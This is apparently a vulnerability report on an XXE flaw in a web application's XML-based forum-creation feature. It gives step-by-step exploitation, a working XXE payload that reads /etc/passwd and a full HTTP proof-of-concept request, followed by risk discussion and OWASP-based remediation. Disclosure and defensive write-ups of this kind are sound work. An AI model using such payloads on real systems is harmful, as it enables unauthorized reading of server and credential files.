# XXE

![Accepted](https://img.shields.io/badge/Status-Accepted-brightgreen) ![CVSS](https://img.shields.io/badge/CVSS-7.5-red)

# Description

This is a Local File Access (LFA) vulnerability identified in the feature that allows importing an XML file, which is then read on the "/index.php?page=volunteer/create_forum.php " page. The XML parsing does not adequately handle external entities, leading to the potential for XML External Entity (XXE) injection.

# Exploitation

1. Login to the application
2. Create your association
3. Create a new forum and intercept the request with Burp
4. Change the XML info with this Payload 

```sql
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
    <forum>
           <association_uuid>ffb0217c-422c-48de-a805-a9d81e6d0026</association_uuid>
           <title>aaaavvvvv</title>
           <description>&file;aaa</description>
           <csrf_token>d999891e466cd87c3e252fbeac79829e5e0c50b577cbf77afddbca68d7aa25a9</csrf_token>
        </forum>
```

1. **Inject a system call in the DOCTYPE to read a file:** This XML payload includes an entity declaration that references the `/etc/passwd` file.
2. **View the imported content:** The content of the `/etc/passwd` file is displayed on the  "[/index.php?page=volunteer/list_forum.php&uuid=](https://9c20782de35f.3xploit.me/index.php?page=volunteer/list_forum.php&uuid=ffb0217c-422c-48de-a805-a9d81e6d0026)<your_uid>" page.

# PoC

Intercept the request with a tool like Burp, change the xml payload with the payload above, send the request

![Capture d’écran 2025-04-27 à 02.45.15.png](assets/image%202.png)

Request :

```xml
POST /index.php?page=volunteer/create_forum.php HTTP/2
Host: 9c20782de35f.3xploit.me
Cookie: PHPSESSID=<your_cookie_id>
...

<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
    <forum>
           <association_uuid>ffb0217c-422c-48de-a805-a9d81e6d0026</association_uuid>
           <title>omgggg</title>
           <description>&file;aaa</description>
           <csrf_token>d999891e466cd87c3e252fbeac79829e5e0c50b577cbf77afddbca68d7aa25a9</csrf_token>
        </forum>
```

Visit the [/index.php?page=volunteer/list_forum.php&uuid=](https://9c20782de35f.3xploit.me/index.php?page=volunteer/list_forum.php&uuid=ffb0217c-422c-48de-a805-a9d81e6d0026)<your_uid> page and you should see the /etc/passwd file exposed

![image.png](assets/image.png)

# Risk

This vulnerability allows attackers to read arbitrary files on the server. The primary risk is to the confidentiality of the company's data, as attackers can access sensitive files, including the application's source code, configuration files, and other sensitive data stored on the server.

# Remediation

Based on the [OWASP XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html), the following steps can be taken to mitigate this vulnerability:

1. **Disable DTDs (External Entities) in the XML parser**: Configure the XML parser to disallow the processing of external entities.
2. **Use a secure XML parser**: Use libraries that handle XML parsing securely by default.
3. **Filter user inputs**: Validate and sanitize all user inputs before processing.
4. **Use less powerful parsers**: If possible, use simpler and less powerful parsers that do not support features that can lead to XXE vulnerabilities, such as JSON parsers.

Example of disabling external entities in Python's `defusedxml` library:

```python
import defusedxml.ElementTree as ET

def parse_xml(xml_string):
    tree = ET.fromstring(xml_string)
    return tree
```

By implementing these measures, you can protect your application from XXE and related vulnerabilities.

# References

[https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) 

[https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

# Author

4Fromages